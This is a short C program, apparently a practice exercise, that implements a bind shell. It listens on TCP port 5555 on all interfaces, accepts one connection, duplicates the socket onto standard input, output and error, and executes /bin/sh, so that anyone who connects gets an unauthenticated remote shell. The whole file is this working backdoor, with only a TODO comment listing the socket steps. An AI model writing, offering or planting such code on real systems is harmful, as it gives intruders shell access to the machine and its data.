#include <stdio.h>
#include <netinet/in.h>
#include <sys/socket.h>

/*TODO
Make a socket()
Bind() it 
Listen()
Accept()
*/


int main(){
	
	struct sockaddr_in server_addr;
	server_addr.sin_family=AF_INET;
	server_addr.sin_addr.s_addr = INADDR_ANY;
	server_addr.sin_port = htons(5555);

	int sockfd = socket(AF_INET, SOCK_STREAM,0);
	if(sockfd == -1){
		printf("Error creating socket.\n");
		return 1;
	}

	int bindfd = bind(sockfd, (struct sockaddr *)&server_addr,sizeof(server_addr));

	listen(sockfd,0);

	int acceptfd = accept(sockfd, NULL,NULL);

	for(int i = 0;i<3;i++){
		dup2(acceptfd,i);
	}

	execve("/bin/sh",NULL,NULL);
}


